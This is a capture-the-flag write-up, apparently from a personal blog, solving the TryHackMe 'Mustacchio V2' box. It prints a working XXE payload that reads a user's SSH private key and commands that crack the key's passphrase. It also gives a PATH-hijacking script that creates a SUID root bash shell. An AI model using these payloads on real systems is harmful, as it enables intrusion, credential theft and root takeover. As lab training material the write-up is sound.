---
title: 'Mustacchio V2'
date: '2025-11-05T10:48:00+08:00'
lastmod: '2025-11-05T10:48:00+08:00'
draft: false
description: 'A TryHackMe box involving web exploitation, XXE injection, SSH key cracking, and SUID privilege escalation through PATH hijacking.'
summary: ''
tags: ["Easy", "Web", "Linux PrivEsc", "TryHackMe"]
categories: []
series: []
author: "Zeus Dela Cruz"
tools: ["rustscan", "gobuster", "ssh2john", "john", "strings"]
techniques: ["Directory Enumeration", "XXE Injection", "SSH Key Cracking", "SUID Exploitation", "PATH Hijacking"]

# Enable features for post
showToc: true
TocOpen: false
hidemeta: false
comments: false
disableShare: false
disableHLJS: false
searchHidden: false
ShowReadingTime: true
ShowWordCount: true
ShowCodeCopyButtons: true

# Cover image (optional)
cover:
  image: '' # /images/filename.jpg
  alt: ''
  caption: ''
  relative: false
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# Canonical link (for SEO)
canonicalURL: ''

# External edit link
editPost:
  URL: "https://github.com/freymeyer/myportfolio/tree/main/content"
  Text: "Suggest Changes"
  appendFilePath: true
---

## Enumeration

Starting with a port scan using rustscan:
```bash
rustscan -a <target_ip>
```

Found two open ports:
- Port 80: HTTP website
- Port 8765: Admin panel

## Web Exploitation

### Finding Credentials

Using gobuster to enumerate directories on port 80:
```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

Found `/custom/` directory containing `users.bak` file with admin credentials:
```
admin:1868e36a6d2b17d4c2745f1659433a54
```

Used CrackStation to crack the hash and obtained the admin password.

### XXE Injection

Accessed the admin panel at `http://<target_ip>:8765` and logged in with the cracked credentials.

The admin panel had a comment submission feature. Testing for XXE vulnerability, I crafted a payload to read Barry's SSH private key:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<comment>
  <name>&xxe;</name>
  <author>admin</author>
  <com>test</com>
</comment>
```

Successfully extracted Barry's encrypted SSH private key.

## Initial Access

### Cracking SSH Key

The SSH key was encrypted with a passphrase. Used `ssh2john` to extract the hash:
```bash
ssh2john barry_key.txt > barry_hash.txt
```

Cracked the hash using John the Ripper with rockyou wordlist:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt barry_hash.txt
```

Password found: **urieljames**

### SSH Access
```bash
chmod 600 barry_key.txt
ssh -i barry_key.txt barry@<target_ip>
# Enter passphrase: urieljames
```

Successfully logged in as barry and obtained the user flag:
```bash
cat ~/user.txt
```

## Privilege Escalation

### Enumeration

Searched for SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```

Found an interesting SUID binary: `/home/joe/live_log` (owned by root)

### Analyzing the Binary

Used `strings` to analyze the binary:
```bash
strings /home/joe/live_log
```

Key findings:
- Binary calls `setuid` and `setgid`
- Executes command: `tail -f /var/log/nginx/access.log`
- **Vulnerability**: Uses relative path `tail` instead of absolute path `/usr/bin/tail`

This is exploitable through PATH hijacking!

### Exploitation

Created a malicious `tail` script in `/tmp`:
```bash
cd /tmp

cat > tail << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF

chmod +x tail
```

Hijacked the PATH environment variable:
```bash
export PATH=/tmp:$PATH
```

Executed the SUID binary (it will run our fake `tail` as root):
```bash
/home/joe/live_log
# Press Ctrl+C after a second
```

Spawned root shell:
```bash
/tmp/rootbash -p
```

### Root Flag
```bash
whoami  # root
cd /root
cat root.txt
```

## Summary

1. **Web Enumeration** → Found backup file with admin hash
2. **Hash Cracking** → Used CrackStation to crack admin password
3. **XXE Injection** → Extracted Barry's encrypted SSH key
4. **SSH Key Cracking** → Used john to crack passphrase (urieljames)
5. **Initial Access** → SSH as barry, obtained user flag
6. **SUID Discovery** → Found `/home/joe/live_log` with improper PATH usage
7. **PATH Hijacking** → Created malicious `tail` script
8. **Root Shell** → Exploited SUID binary to create rootbash
9. **Root Flag** → Retrieved from `/root/root.txt`

## Key Takeaways

- Always sanitize XML input to prevent XXE attacks
- Use absolute paths in SUID binaries to prevent PATH hijacking
- Encrypted SSH keys can be cracked if weak passphrases are used
- Regular enumeration of SUID binaries is crucial for privilege escalation
